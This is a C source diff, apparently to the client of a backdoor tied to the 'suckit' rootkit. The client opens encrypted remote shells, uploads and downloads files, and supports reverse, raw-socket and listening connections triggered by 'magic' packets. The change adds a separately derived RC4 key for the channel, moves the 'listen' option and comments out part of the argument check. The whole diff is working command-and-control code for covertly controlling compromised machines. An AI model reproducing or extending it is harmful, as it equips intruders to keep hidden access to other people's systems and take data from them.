@@ -39,7 +39,7 @@
 
 struct rawsock r;
 int winchange = 1;
-unsigned char clientauth[20], serverauth[20];
+unsigned char clientauth[20], serverauth[20], rc4key[20];
 rc4_ctx rc4_crypt, rc4_decrypt;
 
 // Per la redimesio de finestra
@@ -57,13 +57,13 @@ int usage(char *s) {
         "      * shell => launches a shell (-hd required)\n"
         "      * down => download a file (-hdf required)\n"
         "      * up => uploads a file (-hdf required)\n"
+        "      * listen => listen for a tty connection (-l required)\n"
         "      * TODO:check => check if suckit is running on remote host (-hd required)\n"
         "      * TODO:socks4a => opens a socks server in the client that forward the traffic through the server\n"
 		"   -c: connection type\n"
         "      * tcp => a direct tcp connection to the server\n"
         "      * rev => ask for a reverse connection (-hld required)\n"
         "      * raw => raw connection (only transfer small files) (-ld required)\n"
-        "      * listen => listen for a tty connection (-l required)\n"
 		"   -h: host or ip address\n"
 		"   -l: local port to listen (enables reverse mode and disables raw mode)\n"
 		"   -d: destination port to send magic\n"
@@ -80,8 +80,8 @@ int client_shell(int rsock, int wsock) {
 	struct timeval tv;
 	int nfd = 0;
 
-    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_crypt);
-    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_decrypt);
+    rc4_init(rc4key, sizeof(RC4KEY), &rc4_crypt);
+    rc4_init(rc4key, sizeof(RC4KEY), &rc4_decrypt);
 
     signal(SIGWINCH, sig_winch);
 
@@ -171,7 +171,7 @@ int client_upload(int sock, char *file) {
     unsigned char buf[BUFSIZE];
     unsigned long size, transfered;
 
-    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_crypt);
+    rc4_init(rc4key, sizeof(RC4KEY), &rc4_crypt);
 
     if ((fd = open(file, O_RDONLY)) < 0) {
         perror("open");
@@ -205,7 +205,7 @@ int client_download(int sock, char *file) {
     int nfd = 0;
     fd_set  fds;
 
-    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_decrypt);
+    rc4_init(rc4key, sizeof(RC4KEY), &rc4_decrypt);
 
     // Timeout
     tv.tv_sec=15;
@@ -352,6 +352,9 @@ void get_pass() {
     int i = 0;
     for (i = 0; i < 20; i++) {
         serverauth[i] = clientauth[i]^p[0];
+    }
+    for (i = 0; i < 20; i++) {
+        rc4key[i] = clientauth[i]^p[1];
     }
 }
 
@@ -543,14 +546,14 @@ int main(int argc, char *argv[]) {
         ((con_type == CON_REV && ((!host) || (dest_port == -1) || (local_port == -1) ))) ||
         ((con_type == CON_RAW && ((!host) || (dest_port == -1) || (local_port == -1) ))) ||
         ((con_type == LISTEN && (local_port == -1))) ||
-        ((action == UPLOAD || action == DOWNLOAD) && (!file)) ||
+        ((action == UPLOAD || action == DOWNLOAD) && (!file)) 
 //		((action == SHELL)    && ((!host) || (dest_port == -1))) ||
 //		((action == UPLOAD)   && ((!host) || (dest_port == -1)   || (!file))) ||
 //		((action == DOWNLOAD) && ((!host) || (dest_port == -1)   || (!file))) ||
 //		((action == CHECK)    && ((!host) || (dest_port == -1))) ||
 //		(local_port == -1 && con_type != CON_TCP) || (action == -1) ||
 //      ((con_type == LISTEN && local_port == -1) ||
-		(con_type == -1) || (action == -1)
+////		(con_type == -1) || (action == -1)
 		)  {
 			return usage(argv[0]);
 	}
